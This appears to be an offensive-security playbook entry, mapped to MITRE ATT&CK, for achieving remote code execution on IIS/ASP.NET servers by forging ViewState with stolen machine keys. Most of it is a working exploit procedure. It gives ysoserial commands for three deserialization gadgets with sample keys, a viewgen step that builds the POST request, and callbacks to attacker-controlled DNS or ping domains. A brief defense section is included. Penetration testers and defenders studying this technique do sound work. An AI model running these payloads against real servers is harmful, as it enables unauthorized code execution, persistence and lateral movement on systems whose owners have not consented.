---
type: procedure
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - '[[techniques/Server Software Component|T1505 - Server Software Component]]'
  - '[[techniques/Unsecured Credentials|T1552 - Unsecured Credentials]]'
sub_techniques:
  - >-
    [[sub-techniques/Credentials in Registry|T1552.002 - Credentials in
    Registry]]
tags:
  - iis
  - viewstate
  - rce
  - machine-key
  - deserialization
  - api-key-leaks
  - exploit
commands:
  - '[[commands/ysoserial-viewstate-textformattingrunproperties]]'
  - '[[commands/ysoserial-viewstate-typeconfusedelegate]]'
  - '[[commands/ysoserial-viewstate-activitysurrogateselectorfromfile]]'
  - '[[commands/viewgen-generate-post-request]]'
tools:
  - '[[tools/ysoserial]]'
  - '[[tools/viewgen]]'
platforms:
  - Windows
  - IISServers
  - Web
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Generate-Malicious-ViewState-for-IIS-RCE-Using-Machine-Keys

## Summary

This procedure exploits insecurely configured IIS machine keys to generate malicious ViewState payloads for remote code execution (RCE) on vulnerable ASP.NET web applications. By extracting the decryption and validation keys from the server's configuration (e.g., web.config or registry), attackers can craft deserialization payloads using tools like ysoserial, enabling arbitrary code execution upon ViewState processing.

## Description

IIS machine keys are used to encrypt and sign ViewState data in ASP.NET applications to prevent tampering and ensure integrity. If these keys are exposed or weakly generated (e.g., default or predictable values stored in web.config or the registry), attackers can decrypt, modify, and re-encrypt ViewState to inject malicious .NET gadgets. This leads to deserialization vulnerabilities, allowing RCE through gadgets like TextFormattingRunProperties, TypeConfuseDelegate, or ActivitySurrogateSelectorFromFile. The procedure assumes access to a vulnerable endpoint that processes user-supplied ViewState (e.g., via POST requests) and requires the machine keys beforehand, often obtained via reconnaissance or misconfiguration exposure. Success results in command execution on the server, such as DNS callbacks, file writes, or shell commands, facilitating initial access, lateral movement, or persistence in Windows/IIS environments.

## Requirements

1. Network access to a vulnerable ASP.NET web application endpoint that processes ViewState (e.g., HTTP/HTTPS POST to a form-handling page).
2. Knowledge of the target's IIS machine keys, including decryption key, validation key, generator, decryption algorithm (e.g., AES), and validation algorithm (e.g., SHA1 or MD5).
3. ysoserial.exe tool installed on the attacker's Windows machine for payload generation.
4. viewgen tool or a proxy like Burp Suite for crafting and sending the POST request with the malicious ViewState.
5. A listening service (e.g., DNS resolver or command server) to verify RCE via callbacks.

## Defense

- Rotate and secure IIS machine keys regularly, using auto-generated keys and storing them outside web.config (e.g., in secure vaults); avoid registry storage without encryption.
- Disable ViewState for non-essential controls and enable ViewState MAC validation; use ASP.NET 4.5+ with stricter deserialization protections.
- Implement a web application firewall (WAF) to detect anomalous ViewState sizes, unusual gadget chains, or deserialization attempts; monitor for ysoserial-generated payloads via signature-based rules.
- Enable .NET deserialization guards like custom ObjectDataProvider blacklisting and log all deserialization events for anomaly detection.

## Objectives

1. Extract or obtain the target's IIS machine keys to enable payload crafting.
2. Generate a valid, malicious ViewState payload tailored to the keys for RCE.
3. Deliver the payload via POST request to trigger deserialization and execute arbitrary commands on the server.
4. Verify execution through outbound callbacks (e.g., DNS lookup or file creation).

## Instructions

### Step 1: Prepare Machine Keys

**Context**: Ensure you have the necessary IIS machine keys from the target's web.config, registry (HKLM\SOFTWARE\Microsoft\ASP.NET\...), or exposed configurations. These include the decryptionKey, validationKey, decryptionAlgorithm (e.g., AES), validationAlgorithm (e.g., SHA1), and generator (e.g., auto or custom hex).

No specific command required here; manually note the values (e.g., validationKey="b07b0f97365416288cf0247cffdf135d25f6be87").

> If keys are unknown, reconnaissance techniques like directory traversal or config file exposure may be needed prior to this procedure.

### Step 2: Generate ViewState Payload with TextFormattingRunProperties Gadget

**Context**: Use ysoserial to create a basic RCE payload that executes a DNS lookup for callback verification. This gadget is suitable for initial testing and requires AES decryption and SHA1 validation.

**Command** ([[commands/ysoserial-viewstate-textformattingrunproperties]]):
```cmd
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c nslookup $_COLLAB_DOMAIN" --decryptionalg="AES" --generator=$_GENERATOR decryptionkey="$_DECRYPTION_KEY" --validationalg="SHA1" --validationkey="$_VALIDATION_KEY"
```

> This command outputs a base64-encoded ViewState string. Substitute placeholders with actual values (e.g., $_COLLAB_DOMAIN as your controlled DNS domain). Expected output is a long base64 string starting with "/wE..." representing the serialized payload. Success is indicated by the tool completing without errors and producing a valid ViewState blob.

### Step 3: Generate ViewState Payload with TypeConfuseDelegate Gadget

**Context**: Craft a payload for file write operations using the TypeConfuseDelegate gadget, which bypasses some .NET protections. This uses MD5 validation for compatibility with certain IIS configs.

**Command** ([[commands/ysoserial-viewstate-typeconfusedelegate]]):
```cmd
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\pwn.txt" --generator="CA0B0334" --validationalg="MD5" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
```

> Outputs a malicious ViewState for writing a test file. Use specific keys as shown or adapt. Expected output: base64 ViewState string. Verify by checking for the file creation post-execution.

### Step 4: Generate Advanced ViewState Payload with ActivitySurrogateSelectorFromFile Gadget

**Context**: For more complex RCE involving custom classes, use the ActivitySurrogateSelectorFromFile gadget, referencing local assemblies for execution. This requires SHA1 validation.

**Command** ([[commands/ysoserial-viewstate-activitysurrogateselectorfromfile]]):
```cmd
ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\$_USERNAME\Desktop\ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
```

> Tailor the -c path to target-specific files. Expected output: base64 ViewState. This gadget loads and executes from specified DLLs, enabling advanced persistence or escalation.

### Step 5: Craft and Send POST Request with ViewState

**Context**: Use viewgen to generate a complete HTTP POST request incorporating the malicious ViewState, or manually via Burp Suite. Target the vulnerable endpoint (e.g., login or form page) that deserializes ViewState.

**Command** ([[commands/viewgen-generate-post-request]]):
```cmd
viewgen --webconfig web.config -m CA0B0334 -c "ping $_CALLBACK_DOMAIN"
```

> Provide the web.config with machine keys or use extracted values. Outputs a POST request body. In Burp Suite, URL-encode special characters in the ViewState (e.g., / + =). Send to the target endpoint. Expected output: Formatted HTTP request. Success: Server response without errors, plus callback (e.g., ICMP echo or DNS query to your domain).
